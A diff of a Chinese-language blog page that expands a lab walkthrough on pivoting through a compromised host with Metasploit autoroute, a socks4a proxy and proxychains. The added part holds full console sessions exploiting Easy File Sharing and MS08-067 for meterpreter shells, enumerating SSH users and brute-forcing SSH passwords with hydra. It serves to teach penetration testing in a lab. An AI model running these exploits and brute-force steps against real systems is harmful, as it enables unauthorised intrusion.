@@ -121,7 +121,7 @@
 
       <div class="read-time">
         <small>
-          4 minute read
+          9 minute read
         </small>
       </div>
 
@@ -189,7 +189,15 @@ IPv4 Netmask : 255.255.255.0
 
 <h3 id="step2">Step2</h3>
 
-<p>发现RD有两块网卡后,想办法渗透另一个网段7.7.7.0,首先要添加路由,操作如下:</p>
+<font color="#33ccff">
+发现RD有两块网卡后,想办法渗透另一个网段7.7.7.0,首先要添加路由[不添加路由也可以直接用meterpreter shell中的模块访问
+到7.7.7.x网段,添加路由的目的是为了使得msf模块可以访问到7.7.7.x网段],meterpreter shell可以访问到7.7.7.x网段,msf
+中的模块不能访问到7.7.7.x网段,msf中的模块所处的ip是攻击者的ip,meterpreter shell所处的ip是RD的ip.在meterpreter中
+添加路由的目的是为了给msf模块作代理,也即给Attacker作代理,但是只能给Attacker的msf模块作代理,要想给Attacker的其他
+应用程序作代理,则需要在meterpreter添加路由后再运行msf的开启sock4的模块,然后再用proxychains来设置Attacker的其他
+应用程序的代理为msf中设置的代理入口.
+</font>
+<p>操作如下:</p>
 <div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; run autoroute -s 7.7.7.0/24
 [*] Adding a route to 7.7.7.0/255.255.255.0...
 [+] Added route to 7.7.7.0/255.255.255.0 via 172.16.0.11
@@ -215,8 +223,9 @@ meterpreter &gt;
 </code></pre>
 </div>
 <p>arp_scanner不太够用,不能扫到端口信息[此时也可用msf自带的其他可以扫描端口的模块如auxiliary/scanner/portscan/tcp来扫
-描,因为前面添加了路由],于是用Attacker本机的nmap来扫[可以更完全的扫描,nmap应该比msf中的扫描模块强大],首先在RD上开
-sockets4代理,然后用proxychains设置nmap的代理为RD在Attacker的1080端口开启的代理,操作如下:</p>
+描,因为前面添加了路由,使得msf中的模块可以用meterpreter作为代理访问到7.7.7.x网段],于是用Attacker本机的nmap来扫[可以
+更完全的扫描,nmap应该比msf中的扫描模块强大],首先在RD上开sockets4代理,然后用proxychains设置nmap的代理为msf模块开
+启的Attacker的1080端口提供的代理,操作如下:</p>
 <div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; background 
 [*] Backgrounding session 2...
 msf &gt; use auxiliary/server/socks4a 
@@ -322,13 +331,14 @@ meterpreter &gt;
 <pre>
 <font color="#33ccff">
 这里的portfwd模块不只是名字上的端口转发的意思,目前笔者认为portfwd相当于半个ssh正向代理加一个ssh反向代理组成的综合命
-令,ssh正向反向代理可参考这里的理解 <a href="http://3xp10it.cc/web/2017/02/24/ssh%E6%AD%A3%E5%90%91%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%90%86%E8%A7%A3/">ssh正向反向代理理解</a>
+令,ssh正向反向代理可参考这里的理解 
+<a href="http://3xp10it.cc/web/2017/02/24/ssh%E6%AD%A3%E5%90%91%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%90%86%E8%A7%A3/">ssh正向反向代理理解</a>
 
 笔者认为portfwd命令之后Attacker可以通过访问Attacker本身ip的2323端口进而访问到JC的80端口期间发生了3件事
 <img src="https://raw.githubusercontent.com/3xp10it/pic/master/dot/portfwd.png" />
 
 1.RD访问JC的80端口,这里相当于半个ssh正向代理
-2.RD绑定已经访问到的JC的80端口的数据到Attacker的2323端口,这里相当于一个ssh反向代理
+2.RD绑定已经访问到的JC的80端口的数据到Attacker的2323端口,这里相当于一个ssh反向代理,相当于RD有Attacker的ssh权限
 3.攻击者的浏览器访问攻击者自己的172.16.0.20:2323
 
 portfwd的用法如下:
@@ -354,8 +364,204 @@ meterpreter会话连通两台,-l是指攻击者的监听端口,运行完上面�
 这里还要注意route add命令只能是在meterpreter会话中有效,不能系统全局有效,笔者认为route add也是通过meterpreter会
 话的"隧道"来实现攻击者能够访问目标机器其他网段机器的,也即在上面的Attacker通过portfwd来实现访问目标机器其他网段
 机器而不能因为在portfwd模块运行前由于已经运行了route add模块而由Attacker的浏览器直接访问目标7.7.7.20:80,因为
-route add只能在meterpreter的会话中起作用,只有meterpreter会话下可用的模块可以直接访问7.7.7.x网段
+route add只会给msf的模块提供meterpreter会话通道作为代理服务,只有meterpreter会话下可用的模块可以直接访问7.7.7.x
+网段,Attacker的浏览器想直接访问7.7.7.20需要使用proxychins和msf开启的sock4代理.
 </font>
+
+<p>上面访问得到目标机器JC的80端口信息看出JC运行的是Eash File Sharing Web Server,可用msf中的模块尝试getshell,操作如
+下(如果没有在meterpreter中添加路由msf是访问不到7.7.7.20的):</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>msf  &gt; use exploit/windows/http/easyfilesharing_seh 
+msf exploit(easyfilesharing_seh) &gt; show options 
+Module options (exploit/windows/http/easyfilesharing_seh):
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST                   yes       The target address
+   RPORT  80               yes       The target port
+Exploit target:
+   Id  Name
+   --  ----
+   0   Easy File Sharing 7.2 HTTP
+msf exploit(easyfilesharing_seh) &gt; set rhost 7.7.7.20
+rhost =&gt; 7.7.7.20
+msf exploit(easyfilesharing_seh) &gt; set payload windows/meterpreter/bind_tcp
+payload =&gt; windows/meterpreter/bind_tcp
+msf exploit(easyfilesharing_seh) &gt; run
+[*] Started bind handler
+[*] 7.7.7.20:80 - 7.7.7.20:80 - Sending exploit...
+[+] 7.7.7.20:80 - Exploit Sent
+[*] Sending stage (957999 bytes) to 7.7.7.20
+[*] Meterpreter session 2 opened (172.16.0.20-172.16.0.11:0 -&gt; 7.7.7.20:4444) at 2016-12-26 14:21:11 +0300
+</code></pre>
+</div>
+<p>或者从JC(7.7.7.20)22端口入手:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>msf &gt; use auxiliary/scanner/ssh/ssh_enumusers 
+msf auxiliary(ssh_enumusers) &gt; set rhosts 7.7.7.20
+rhosts =&gt; 7.7.7.20
+msf auxiliary(ssh_enumusers) &gt; set rport 22
+rport =&gt; 22
+msf auxiliary(ssh_enumusers) &gt; set user_file /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt
+user_file =&gt; /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt
+msf auxiliary(ssh_enumusers) &gt; run
+[*] 7.7.7.20:22 - SSH - Checking for false positives
+[*] 7.7.7.20:22 - SSH - Starting scan
+[+] 7.7.7.20:22 - SSH - User 'admin' found
+[-] 7.7.7.20:22 - SSH - User 'root' not found
+[-] 7.7.7.20:22 - SSH - User 'Administrator' not found
+[+] 7.7.7.20:22 - SSH - User 'sysadm' found
+[-] 7.7.7.20:22 - SSH - User 'tech' not found
+[-] 7.7.7.20:22 - SSH - User 'operator' not found
+[+] 7.7.7.20:22 - SSH - User 'guest' found
+[-] 7.7.7.20:22 - SSH - User 'security' not found
+[-] 7.7.7.20:22 - SSH - User 'debug' not found
+[+] 7.7.7.20:22 - SSH - User 'manager' found
+[-] 7.7.7.20:22 - SSH - User 'service' not found
+[-] 7.7.7.20:22 - SSH - User '!root' not found
+[+] 7.7.7.20:22 - SSH - User 'user' found
+[-] 7.7.7.20:22 - SSH - User 'netman' not found
+[+] 7.7.7.20:22 - SSH - User 'super' found
+[-] 7.7.7.20:22 - SSH - User 'diag' not found
+[+] 7.7.7.20:22 - SSH - User 'Cisco' found
+[-] 7.7.7.20:22 - SSH - User 'Manager' not found
+[+] 7.7.7.20:22 - SSH - User 'DTA' found
+[-] 7.7.7.20:22 - SSH - User 'apc' not found
+[+] 7.7.7.20:22 - SSH - User 'User' found
+[-] 7.7.7.20:22 - SSH - User 'Admin' not found
+[+] 7.7.7.20:22 - SSH - User 'cablecom' found
+[-] 7.7.7.20:22 - SSH - User 'adm' not found
+[+] 7.7.7.20:22 - SSH - User 'wradmin' found
+[-] 7.7.7.20:22 - SSH - User 'netscreen' not found
+[+] 7.7.7.20:22 - SSH - User 'sa' found
+[-] 7.7.7.20:22 - SSH - User 'setup' not found
+[+] 7.7.7.20:22 - SSH - User 'cmaker' found
+[-] 7.7.7.20:22 - SSH - User 'enable' not found
+[+] 7.7.7.20:22 - SSH - User 'MICRO' found
+[-] 7.7.7.20:22 - SSH - User 'login' not found
+[*] Caught interrupt from the console...
+[*] Auxiliary module execution completed
+^C
+msf auxiliary(ssh_enumusers) &gt;
+</code></pre>
+</div>
+<p>然后用hydra本地用msf模块开启的1080端口的sock4代理尝试爆破:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# proxychains hydra 7.7.7.20 ssh -s 22 -L /tmp/user.txt -P top100.txt -t 4
+ProxyChains-3.1 (http://proxychains.sf.net)
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+Hydra (http://www.thc.org/thc-hydra) starting 
+[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
+[DATA] max 4 tasks per 1 server, overall 64 tasks, 20 login tries (l:2/p:10), ~0 tries per task
+[DATA] attacking service ssh on port 22
+|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
+|S-chain|-&lt;&gt;-172.16.0.20:1080-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-7.7.7.20:22-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
+&lt;&gt;&lt;&gt;-OK
+&lt;&gt;&lt;&gt;-OK
+&lt;&gt;&lt;&gt;-OK
+|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
+[22][ssh] host: 7.7.7.20   login: admin   password: 123456
+|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
+&lt;&gt;&lt;&gt;-OK
+|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
+|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished
+root@kali:~#
+</code></pre>
+</div>
+<p>发现有可用帐户密码admin:123456,然后再用sock4代理ssh登录:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>root@kali:~# proxychains ssh admin@7.7.7.20
+ProxyChains-3.1 (http://proxychains.sf.net)
+|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
+The authenticity of host '7.7.7.20 (7.7.7.20)' can't be established.
+ECDSA key fingerprint is SHA256:Rcz2KrPF3BTo16Ng1kET91ycbr9c8vOkZcZ6b4VawMQ.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '7.7.7.20' (ECDSA) to the list of known hosts.
+admin@7.7.7.20's password: 
+bvshell:/C/Documents and Settings/All Users$ pwd
+/C/Documents and Settings/All Users
+bvshell:/C/Documents and Settings/All Users$ dir
+2016-12-24  21:32          &lt;DIR&gt; Application Data
+2016-12-25  06:16          &lt;DIR&gt; Desktop
+2016-12-24  18:36          &lt;DIR&gt; Documents
+2016-12-24  18:37          &lt;DIR&gt; DRM
+2016-12-24  21:32          &lt;DIR&gt; Favorites
+2016-12-24  18:38          &lt;DIR&gt; Start Menu
+2016-12-24  21:32          &lt;DIR&gt; Templates
+      0 Files                  0 bytes
+      7 Directories
+bvshell:/C/Documents and Settings/All Users$
+</code></pre>
+</div>
+<p>或者用ms08067:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>msf &gt; use exploit/windows/smb/ms08_067_netapi 
+msf exploit(ms08_067_netapi) &gt; show options 
+Module options (exploit/windows/smb/ms08_067_netapi):
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST                     yes       The target address
+   RPORT    445              yes       The SMB service port
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+Exploit target:
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+msf exploit(ms08_067_netapi) &gt; set rhost 7.7.7.20
+rhost =&gt; 7.7.7.20
+msf exploit(ms08_067_netapi) &gt; set payload windows/meterpreter/bind_tcp
+payload =&gt; windows/meterpreter/bind_tcp
+msf exploit(ms08_067_netapi) &gt; show options 
+Module options (exploit/windows/smb/ms08_067_netapi):
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST    7.7.7.20         yes       The target address
+   RPORT    445              yes       The SMB service port
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+Payload options (windows/meterpreter/bind_tcp):
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LPORT     4444             yes       The listen port
+   RHOST     7.7.7.20         no        The target address
+Exploit target:
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+msf exploit(ms08_067_netapi) &gt; run
+[*] Started bind handler
+[*] 7.7.7.20:445 - Automatically detecting the target...
+[*] 7.7.7.20:445 - Fingerprint: Windows 2003 - Service Pack 2 - lang:Unknown
+[*] 7.7.7.20:445 - We could not detect the language pack, defaulting to English
+[*] 7.7.7.20:445 - Selected Target: Windows 2003 SP2 English (NX)
+[*] 7.7.7.20:445 - Attempting to trigger the vulnerability...
+[*] Sending stage (957999 bytes) to 7.7.7.20
+[*] Meterpreter session 2 opened (172.16.0.20-172.16.0.11:0 -&gt; 7.7.7.20:4444) 
+meterpreter &gt;
+</code></pre>
+</div>
+<p>成功溢出getshell后查看JC(7.7.7.20)网卡信息:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; ipconfig
+Interface  1
+============
+Name         : MS TCP Loopback interface
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 1520
+IPv4 Address : 127.0.0.1
+Interface 65539
+============
+Name         : Intel(R) PRO/1000 MT Desktop Adapter
+Hardware MAC : 08:00:27:29:cd:cb
+MTU          : 1500
+IPv4 Address : 8.8.8.3
+IPv4 Netmask : 255.255.255.0
+Interface 65540
+============
+Name         : Intel(R) PRO/1000 MT Desktop Adapter #2
+Hardware MAC : 08:00:27:e3:47:43
+MTU          : 1500
+IPv4 Address : 7.7.7.20
+IPv4 Netmask : 255.255.255.0
+meterpreter &gt;
+</code></pre>
+</div>
+<p>发现又出现一个8.8.8.x的网段,于是将这个网段添加路由</p>
 </span>
 
         
